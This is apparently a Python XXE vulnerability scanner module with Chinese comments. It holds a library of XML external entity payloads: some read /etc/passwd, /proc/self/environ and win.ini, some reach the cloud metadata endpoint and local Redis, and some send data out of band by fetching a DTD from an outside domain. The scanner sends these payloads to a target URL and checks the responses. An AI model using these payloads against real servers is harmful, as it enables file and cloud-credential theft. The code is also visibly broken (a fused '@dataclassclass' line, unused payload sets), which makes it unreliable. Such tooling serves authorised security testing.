"""WVS v17.0 - XXE 扻描器

XML 外部实体注入检测
"""
import asyncio
import re
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum

try:
    import aiohttp
except ImportError:
    aiohttp = None


class XXEType(Enum):
    IN_BAND = "in_band"       # 直接回显
    BLIND = "blind"           # 盲 XXE (OOB)
    ERROR = "error"           # 错误回显


@dataclassclass XXEResult:
    vulnerable: bool
    xxe_type: XXEType
    endpoint: str
    method: str
    content_type: str
    payload: str
    entity_used: str
    evidence: str
    confidence: float


# XXE Payload 库
XXE_PAYLOADS = {
    "file_read": [
        '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>''',
        '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>''',
        '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
]>
<root><data>&xxe;</data></root>''',
    ],
    "ssrf": [
        '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>''',
        '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">
]>
<root><data>&xxe;</data></root>''',
    ],
    "parameter_entity": [
        '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{domain}">
%xxe;
]>
<root></root>''',
        '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe2 "&xxe;">
]>
<root>&xxe2;</root>''',
    ],
    "blind_oob": [
        '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{domain}/xxe.dtd">
%xxe;
]>
<root>&exfil;</root>''',
    ],
    "error_based": [
        '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///nonexistent/path/test">
]>
<root><data>&xxe;</data></root>''',
    ],
    "cdata_wrapper": [
        '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>''',
    ],
}

# 检测特征
XXE_EVIDENCE = {
    "unix_passwd": [
        r"root:[x*]:0:0:",
        r"daemon:[x*]:1:1:",
        r"/bin/(ba)?sh",
    ],
    "windows_ini": [
        r"\[fonts\]",
        r"\[extensions\]",
        r"MAPI=1",
    ],
    "error_indicators": [
        r"XML parser error",
        r"SimpleXMLElement",
        r"DOMDocument::loadXML",
        r"libxml2",
        r"Failed to load external entity",
        r"Entity 'xxe' not defined",
        r"file_get_contents\(\)",
        r"No such file or directory",
    ],
    "cloud_metadata": [
        r"ami-id",
        r"instance-id",
        r"local-ipv4",
    ],
}


class XXEScannerV17:
    """XXE 扫描器 v17.0"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.oob_domain = self.config.get("oob_domain", "burpcollaborator.net")
    
    async def scan(
        self,
        url: str,
        method: str = "POST",
        headers: Dict[str, str] = None,
        body_template: str = None,
        content_type: str = "application/xml"
    ) -> List[XXEResult]:
        """扫描 XXE"""
        results = []
        
        headers = headers or {}
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
            # 测试文件读取
            file_result = await self._test_file_read(
                session, url, method, headers, body_template, content_type
            )
            if file_result:
                results.append(file_result)
            
            # 测试 SSRF
            ssrf_result = await self._test_ssrf(
                session, url, method, headers, body_template, content_type
            )
            if ssrf_result:
                results.append(ssrf_result)
            
            # 测试错误回显
            error_result = await self._test_error_based(
                session, url, method, headers, body_template, content_type
            )
            if error_result:
                results.append(error_result)
        
        return results
    
    async def _test_file_read(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        headers: Dict,
        body_template: Optional[str],
        content_type: str
    ) -> Optional[XXEResult]:
        """测试文件读取"""
        
        for payload in XXE_PAYLOADS["file_read"]:
            try:
                response_text = await self._send_xml(
                    session, url, method, headers, payload, content_type
                )
                
                # 检测 Unix passwd
                for pattern in XXE_EVIDENCE["unix_passwd"]:
                    if re.search(pattern, response_text):
                        return XXEResult(
                            vulnerable=True,
                            xxe_type=XXEType.IN_BAND,
                            endpoint=url,
                            method=method,
                            content_type=content_type,
                            payload=payload,
                            entity_used="file:///etc/passwd",
                            evidence=f"发现 /etc/passwd 特征: {pattern}",
                            confidence=0.95
                        )
                
                # 检测 Windows 文件
                for pattern in XXE_EVIDENCE["windows_ini"]:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return XXEResult(
                            vulnerable=True,
                            xxe_type=XXEType.IN_BAND,
                            endpoint=url,
                            method=method,
                            content_type=content_type,
                            payload=payload,
                            entity_used="file:///c:/windows/win.ini",
                            evidence=f"发现 Windows 文件特征: {pattern}",
                            confidence=0.95
                        )
            
            except:
                pass
        
        return None
    
    async def _test_ssrf(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        headers: Dict,
        body_template: Optional[str],
        content_type: str
    ) -> Optional[XXEResult]:
        """测试 SSRF via XXE"""
        
        for payload in XXE_PAYLOADS["ssrf"]:
            try:
                response_text = await self._send_xml(
                    session, url, method, headers, payload, content_type
                )
                
                for pattern in XXE_EVIDENCE["cloud_metadata"]:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return XXEResult(
                            vulnerable=True,
                            xxe_type=XXEType.IN_BAND,
                            endpoint=url,
                            method=method,
                            content_type=content_type,
                            payload=payload,
                            entity_used="http://169.254.169.254/",
                            evidence=f"发现云元数据: {pattern}",
                            confidence=0.95
                        )
            
            except:
                pass
        
        return None
    
    async def _test_error_based(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        headers: Dict,
        body_template: Optional[str],
        content_type: str
    ) -> Optional[XXEResult]:
        """测试错误回显"""
        
        for payload in XXE_PAYLOADS["error_based"]:
            try:
                response_text = await self._send_xml(
                    session, url, method, headers, payload, content_type
                )
                
                for pattern in XXE_EVIDENCE["error_indicators"]:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return XXEResult(
                            vulnerable=True,
                            xxe_type=XXEType.ERROR,
                            endpoint=url,
                            method=method,
                            content_type=content_type,
                            payload=payload,
                            entity_used="file:///nonexistent",
                            evidence=f"发现 XML 解析错误: {pattern}",
                            confidence=0.8
                        )
            
            except:
                pass
        
        return None
    
    async def _send_xml(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        headers: Dict,
        payload: str,
        content_type: str
    ) -> str:
        """发送 XML 请求"""
        
        test_headers = {
            "Content-Type": content_type,
            "Accept": "application/xml, text/xml, */*",
            **headers
        }
        
        async with session.request(
            method,
            url,
            data=payload.encode(),
            headers=test_headers
        ) as resp:
            return await resp.text()
    
    def generate_report(self, results: List[XXEResult]) -> Dict:
        """生成报告"""
        return {
            "vulnerabilities": [
                {
                    "type": "XML External Entity (XXE)",
                    "endpoint": r.endpoint,
                    "method": r.method,
                    "content_type": r.content_type,
                    "xxe_type": r.xxe_type.value,
                    "payload": r.payload,
                    "entity_used": r.entity_used,
                    "confidence": r.confidence,
                    "evidence": r.evidence,
                    "severity": "Critical" if r.xxe_type == XXEType.IN_BAND else "High"
                }
                for r in results
            ],
            "summary": {
                "total": len(results),
                "critical": sum(1 for r in results if r.xxe_type == XXEType.IN_BAND),
                "high": sum(1 for r in results if r.xxe_type in [XXEType.ERROR, XXEType.BLIND]),
            }
        }
